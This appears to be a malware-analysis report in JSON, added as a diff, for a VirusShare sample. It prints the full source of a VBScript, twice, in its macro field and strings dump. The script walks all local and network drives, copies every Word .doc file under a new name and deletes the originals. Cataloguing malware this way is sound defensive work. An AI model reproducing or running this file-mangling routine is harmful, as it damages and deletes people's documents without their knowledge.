@@ -1,0 +1,76 @@
+{
+    "docinfo": {
+        "attributes": [],
+        "behavior": {
+            "Run": "May run an executable file or a system command",
+            "createobject": "May create an OLE object"
+        },
+        "macro": "'OS tested win95/98/nt/2000/3000\n'ultrojo tak tanggungjawab atas apa jua kesan menggunakan code ini\n'for educational purpose sahaja tau!\n'any bugs mail me timedotcom@hotmail.com\n'fail ini akan menukar semua nama word document dengan tambahan xxxxxultrojo.doc\n'fail name=ultrojovirus.vbs dan lebih kurang 1-3 minit masa diambil bergantung kelajuan pc anda\n\n\nset fso=createobject(\"Scripting.Filesystemobject\")\nmygirl\nmsgbox \"Semua Nama Document Word telah ditambah ULTROJO hujungnya!\"&vbcr&_\n\"Sila Run Fail ultrojoubat.vbs untuk kembalikan keadaan asal.\"\nsub mygirl\nfor each sayangku in fso.drives\nif sayangku.drivetype = 2 or sayangku.drivetype=3 then 'semua drive aku kerjakan\nfolist(sayangku.path&\"\\\")\nend if\nNext\nend sub\nsub folist(sfolder)\nset fol=fso.getfolder(sfolder)\nset foll=fol.subfolders\nfor each flist in foll\nlisting(flist.path)\nfolist(flist.path)\nnext\nend sub\nsub listing(ll)\nset f=fso.getfolder(ll)\nset fff=f.files\nfor each ff in fff\nbase=fso.getbasename(ff.path)\nset cop=fso.getfile(ff.path)\next=fso.getextensionname(ff.path)\next=lcase(ext)\nif ext=\"doc\" then\ncop.copy(ll&\"\\\"&base&\"ULTROJO.doc\")\nfso.deletefile(ff.path)\nend if\nnext\nend sub\n'end of code\n"
+    },
+    "filename": "VirusShare_116b898aabae023f09938ce13ce29b04",
+    "filesize": 1211,
+    "filetype": "ASCII text, with CRLF line terminators",
+    "hashes": {
+        "md5": "116b898aabae023f09938ce13ce29b04",
+        "sha1": "2cd3909630c068b22fbd3231c26973b79aa3430f",
+        "sha256": "c02147c5f6d143f16b570bc55686d2ec9c7c6dd8c5712e5d0f0f7ad0595aa87d"
+    },
+    "peinfo": {},
+    "strings": {
+        "dump": [
+            "'OS tested win95/98/nt/2000/3000",
+            "'ultrojo tak tanggungjawab atas apa jua kesan menggunakan code ini",
+            "'for educational purpose sahaja tau!",
+            "'any bugs mail me timedotcom@hotmail.com",
+            "'fail ini akan menukar semua nama word document dengan tambahan xxxxxultrojo.doc",
+            "'fail name=ultrojovirus.vbs dan lebih kurang 1-3 minit masa diambil bergantung kelajuan pc anda",
+            "set fso=createobject(\"Scripting.Filesystemobject\")",
+            "mygirl",
+            "msgbox \"Semua Nama Document Word telah ditambah ULTROJO hujungnya!\"&vbcr&_",
+            "\"Sila Run Fail ultrojoubat.vbs untuk kembalikan keadaan asal.\"",
+            "sub mygirl",
+            "for each sayangku in fso.drives",
+            "if sayangku.drivetype = 2 or sayangku.drivetype=3 then 'semua drive aku kerjakan",
+            "folist(sayangku.path&\"\\\")",
+            "end if",
+            "Next",
+            "end sub",
+            "sub folist(sfolder)",
+            "set fol=fso.getfolder(sfolder)",
+            "set foll=fol.subfolders",
+            "for each flist in foll",
+            "listing(flist.path)",
+            "folist(flist.path)",
+            "next",
+            "end sub",
+            "sub listing(ll)",
+            "set f=fso.getfolder(ll)",
+            "set fff=f.files",
+            "for each ff in fff",
+            "base=fso.getbasename(ff.path)",
+            "set cop=fso.getfile(ff.path)",
+            "ext=fso.getextensionname(ff.path)",
+            "ext=lcase(ext)",
+            "if ext=\"doc\" then",
+            "cop.copy(ll&\"\\\"&base&\"ULTROJO.doc\")",
+            "fso.deletefile(ff.path)",
+            "end if",
+            "next",
+            "end sub",
+            "'end of code"
+        ],
+        "file": {
+            "'fail ini akan menukar semua nama word document dengan tambahan xxxxxultrojo.doc": "Word"
+        },
+        "fuzzing": {},
+        "ip": [],
+        "url": []
+    },
+    "time": "0:00:00.280394",
+    "version": "6.0.3",
+    "virustotal": {
+        "positives": "",
+        "total": ""
+    },
+    "yara_plugins": []
+}
